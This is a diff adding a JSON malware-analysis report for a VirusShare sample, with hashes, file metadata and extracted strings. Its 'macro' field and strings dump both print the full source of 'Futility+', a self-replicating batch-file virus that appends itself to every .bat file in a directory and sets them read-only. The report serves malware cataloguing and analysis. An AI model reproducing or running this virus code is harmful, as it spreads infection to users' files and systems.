@@ -1,0 +1,53 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Run": "May run an executable file or a system command",
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "\n\nrem Futility+ by Quantum / VLAD\n---------------------------\n\nrem Below you will find a true batch virus that uses only one external exe.\nrem It uses Attrib to set already infected batch files to read only so they\nrem are not re-infected.  Run the following batch file in a directory with\nrem lots of .bat's and it will infect every one of them.  It contains no\nrem directory transversal methods.\n\n\n@ctty nul\necho if [%%1]==[INFECT.BAT] goto fuckit > infect.bat\necho del something.tmp >> infect.bat\necho copy /b %%1 something.tmp >> infect.bat\necho del %%1 >> infect.bat\necho copy /b %0 + %0.bat + something.tmp %%1 >> infect.bat\necho del something.tmp >> infect.bat\necho attrib +r %%1 >> infect.bat\necho :fuckit >> infect.bat\nfor %%f in (*.bat) do call infect.bat %%f\ndel infect.bat\nctty con\n"
+    },
+    "filename": "VirusShare_31a4a899fa556a3ebe282d1d31d8539a",
+    "filesize": 820,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "31a4a899fa556a3ebe282d1d31d8539a",
+        "sha1": "f0176238c677352ca7eab38d4e0b993a26f85e69",
+        "sha256": "33c3065942550084dd0de79df03c067b10fa5ff3fb6cd0cbd57b2aebc00cf457"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "rem Futility+ by Quantum / VLAD",
+            "---------------------------",
+            "rem Below you will find a true batch virus that uses only one external exe.",
+            "rem It uses Attrib to set already infected batch files to read only so they",
+            "rem are not re-infected.  Run the following batch file in a directory with",
+            "rem lots of .bat's and it will infect every one of them.  It contains no",
+            "rem directory transversal methods.",
+            "@ctty nul",
+            "echo if [%%1]==[INFECT.BAT] goto fuckit > infect.bat",
+            "echo del something.tmp >> infect.bat",
+            "echo copy /b %%1 something.tmp >> infect.bat",
+            "echo del %%1 >> infect.bat",
+            "echo copy /b %0 + %0.bat + something.tmp %%1 >> infect.bat",
+            "echo del something.tmp >> infect.bat",
+            "echo attrib +r %%1 >> infect.bat",
+            "echo :fuckit >> infect.bat",
+            "for %%f in (*.bat) do call infect.bat %%f",
+            "del infect.bat",
+            "ctty con"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.263996",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
